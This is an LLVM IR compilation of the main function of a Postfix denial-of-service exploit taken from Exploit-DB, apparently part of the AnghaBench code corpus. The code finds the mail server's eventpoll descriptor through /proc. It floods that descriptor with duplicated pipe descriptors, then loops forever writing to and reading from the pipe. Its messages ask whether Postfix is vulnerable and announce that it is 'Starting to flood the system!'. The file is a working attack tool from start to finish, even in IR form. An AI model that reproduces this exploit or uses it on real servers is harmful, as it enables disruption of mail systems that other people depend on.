; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_6472.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_6472.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i8* }

@.str = private unnamed_addr constant [12 x i8] c"/proc/%d/fd\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"[*] Opening directory %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"%s/%s\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"eventpoll\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c" => %s points to %s\0A\00", align 1
@FDOPEN = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [51 x i8] c"[!] Are you sure that your postfix is vulnerable?\0A\00", align 1
@.str.6 = private unnamed_addr constant [49 x i8] c"[!] Are you launching me throw a .forward file?\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"[*] Starting to flood the system!\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [2 x i8] c"A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca %struct.dirent*, align 8
  %13 = alloca [256 x i8], align 16
  %14 = alloca [256 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %15 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %16 = call i32 @pipe(i32* %15)
  %17 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %18 = call i32 (...) @getpid()
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32 %18)
  %20 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %23 = call i32* @opendir(i8* %22)
  store i32* %23, i32** %11, align 8
  %24 = load i32*, i32** %11, align 8
  %25 = call %struct.dirent* @readdir(i32* %24)
  store %struct.dirent* %25, %struct.dirent** %12, align 8
  br label %26

26:                                               ; preds = %74, %2
  %27 = load %struct.dirent*, %struct.dirent** %12, align 8
  %28 = icmp ne %struct.dirent* %27, null
  br i1 %28, label %29, label %77

29:                                               ; preds = %26
  %30 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %31 = call i32 @memset(i8* %30, i32 0, i32 256)
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %34 = load %struct.dirent*, %struct.dirent** %12, align 8
  %35 = getelementptr inbounds %struct.dirent, %struct.dirent* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %33, i8* %36)
  %38 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %39 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %40 = call i32 @readlink(i8* %38, i8* %39, i32 256)
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %42 = call i64 @strstr(i8* %41, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %74

44:                                               ; preds = %29
  store i32 1, i32* %10, align 4
  %45 = load %struct.dirent*, %struct.dirent** %12, align 8
  %46 = getelementptr inbounds %struct.dirent, %struct.dirent* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 8
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %47, i8* %48)
  %50 = load %struct.dirent*, %struct.dirent** %12, align 8
  %51 = getelementptr inbounds %struct.dirent, %struct.dirent* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @atoi(i8* %52)
  %54 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @add_fd(i32 %53, i32 %55)
  store i32 0, i32* %9, align 4
  br label %57

57:                                               ; preds = %70, %44
  %58 = load i32, i32* %9, align 4
  %59 = load i32, i32* @FDOPEN, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %73

61:                                               ; preds = %57
  %62 = load %struct.dirent*, %struct.dirent** %12, align 8
  %63 = getelementptr inbounds %struct.dirent, %struct.dirent* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @atoi(i8* %64)
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @dup(i32 %67)
  %69 = call i32 @add_fd(i32 %65, i32 %68)
  br label %70

70:                                               ; preds = %61
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %9, align 4
  br label %57

73:                                               ; preds = %57
  br label %74

74:                                               ; preds = %73, %29
  %75 = load i32*, i32** %11, align 8
  %76 = call %struct.dirent* @readdir(i32* %75)
  store %struct.dirent* %76, %struct.dirent** %12, align 8
  br label %26

77:                                               ; preds = %26
  %78 = load i32*, i32** %11, align 8
  %79 = call i32 @closedir(i32* %78)
  %80 = load i32, i32* %10, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %82, label %86

82:                                               ; preds = %77
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.5, i64 0, i64 0))
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.6, i64 0, i64 0))
  %85 = call i32 @exit(i32 0) #3
  unreachable

86:                                               ; preds = %77
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  %88 = load i32, i32* @stdout, align 4
  %89 = call i32 @fflush(i32 %88)
  %90 = call i32 @close(i32 0)
  %91 = call i32 @close(i32 1)
  %92 = call i32 @close(i32 2)
  br label %93

93:                                               ; preds = %86, %93
  %94 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %95 = load i32, i32* %94, align 4
  %96 = call i32 @write(i32 %95, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), i32 1)
  %97 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %98 = load i32, i32* %97, align 4
  %99 = call i32 @read(i32 %98, i8* %8, i32 1)
  br label %93
}

declare dso_local i32 @pipe(i32*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @opendir(i8*) #1

declare dso_local %struct.dirent* @readdir(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @readlink(i8*, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @add_fd(i32, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @dup(i32) #1

declare dso_local i32 @closedir(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
